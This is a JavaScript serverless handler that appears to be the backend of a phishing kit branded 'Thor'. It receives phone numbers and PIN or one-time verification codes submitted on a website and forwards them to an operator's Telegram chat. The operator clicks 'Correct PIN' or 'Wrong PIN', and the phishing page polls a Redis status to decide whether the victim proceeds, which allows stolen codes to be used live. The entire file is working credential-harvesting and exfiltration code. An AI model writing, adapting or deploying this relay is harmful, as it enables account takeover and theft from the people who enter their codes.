import { Redis } from '@upstash/redis';

const redis = (() => {
  const url = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;
  if (!url || !token) return null;
  return new Redis({ url, token });
})();

export default async function handler(req, res) {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    // 1. GET Request (Website Polling)
    if (req.method === 'GET') {
        try {
            const { userId } = req.query;
            if (!redis) return res.status(500).json({ error: 'Database not connected' });
            const status = await redis.get(`status_${userId}`);
            return res.status(200).json({ status: status || 'pending' });
        } catch (error) {
            return res.status(500).json({ error: 'Database error' });
        }
    }

    // 2. POST Request (From Website)
    if (req.method === 'POST') {
        // Force parse the body in case Vercel didn't do it
        let body = req.body;
        if (typeof body === 'string') {
            try { body = JSON.parse(body); } catch (e) { }
        }

        if (body && body.action === 'send_verification') {
            if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
                return res.status(500).json({ error: "Missing Bot Token or Chat ID in Vercel settings." });
            }
            if (!redis) {
                return res.status(500).json({ error: "Database not connected." });
            }

            try {
                const { phone, pin, userId, type } = body; 
                await redis.set(`status_${userId}`, 'pending'); 

                const text = `# Thor - ${type.toUpperCase()} Verification\n` +
                             `USER DETAILS:\n` +
                             `• Phone Number: ${phone}\n` +
                             `• ${type.toUpperCase()} Code: ${pin}\n` +
                             `• Username: user_${userId}`;

                const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: text,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "✅ Correct PIN", callback_data: `approve_${userId}_${type}` }],
                                [{ text: "❌ Wrong PIN", callback_data: `reject_${userId}_${type}` }]
                            ]
                        }
                    })
                });

                const tgData = await tgRes.json();
                
                if (!tgRes.ok) {
                    // Send the EXACT Telegram error back to the website
                    return res.status(500).json({ error: tgData.description || "Telegram rejected the message" });
                }

                return res.status(200).json({ success: true });
            } catch (error) {
                return res.status(500).json({ error: error.message });
            }
        }
    }

    // 3. POST Request (From Telegram Button Click)
    if (req.method === 'POST' && req.body && req.body.callback_query) {
        try {
            const { id, data, message } = req.body.callback_query;
            const [action, userId, type] = data.split('_'); 

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: id })
            });

            if (action === 'approve') {
                await redis.set(`status_${userId}`, 'approved');
                await editTelegramMessage(message.message_id, `✅ PIN APPROVED - User can proceed`);
            } else if (action === 'reject') {
                await redis.set(`status_${userId}`, 'rejected');
                await editTelegramMessage(message.message_id, `❌ WRONG ${type.toUpperCase()} - Rejected`);
            }
            return res.status(200).send('OK');
        } catch (error) {
            return res.status(500).send('Error');
        }
    }
    
    return res.status(200).send('OK');
}

async function editTelegramMessage(messageId, text) {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: ADMIN_CHAT_ID,
            message_id: messageId,
            reply_markup: { inline_keyboard: [[{ text: text, callback_data: "noop" }]] }
        })
    });
                      }
